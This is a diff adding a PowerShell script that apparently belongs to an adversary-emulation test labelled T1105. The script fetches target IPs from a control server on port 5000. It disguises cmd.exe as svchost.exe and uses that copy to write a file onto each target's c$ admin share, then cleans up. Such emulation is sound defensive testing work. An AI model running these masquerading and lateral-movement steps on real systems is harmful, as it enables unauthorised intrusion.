@@ -1,0 +1,105 @@
+
+
+
+
+
+
+
+function invoke-copy_svchost
+    {
+
+     
+
+param
+(
+[parameter(Mandatory=$true)][String]$Target    
+)
+
+$good = $false
+$results = $null
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+    {       
+        
+    copy  $Env:SystemDrive\Windows\System32\cmd.exe $Env:SystemDrive\svchost.exe
+    sleep 1    
+    $variable = "\\"+$Target+"\c$\T1105.txt"
+    $argumento = '/c' , 'echo write on target '+$variable+': C:\ > '+$variable
+    Start-Process $Env:SystemDrive\svchost.exe  $argumento     
+    sleep 1 
+    $results = Get-Content  $variable
+    if (!($results -eq $null) )
+        {
+        $good = $true 
+        Remove-Item -Path  $variable
+        Remove-Item -Path  $Env:SystemDrive\svchost.exe
+                  
+        }
+    else
+        {
+        $results = "an error ocurred while copying file"            
+        }
+
+    
+        
+
+     }
+else
+    {
+     $results = "Administrator or System privileges necessary."
+    }
+
+
+
+
+
+    return @{results=$results;success=$good}
+    }
+
+
+
+
+$execute = {
+
+}
+
+
+$final_results = ""
+$final_good = $false
+$uri = "http://"+$global:remoteip+":5000/getdata"
+
+
+
+$resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;ip=""} $uri
+$ipaddresses = $resp.Content | ConvertFrom-Json
+
+
+
+
+
+foreach($elem in $ipaddresses.datastore)
+    {
+    $execute = invoke-copy_svchost -target $elem.ip
+    $final_results += $execute.results
+    if($execute.success)
+        {
+        $final_good = $true
+        break
+        }
+
+    }
+
+
+
+
+
+  
+
+  
+
+
+  
+
+
+return @{results=$final_results;success=$final_good}
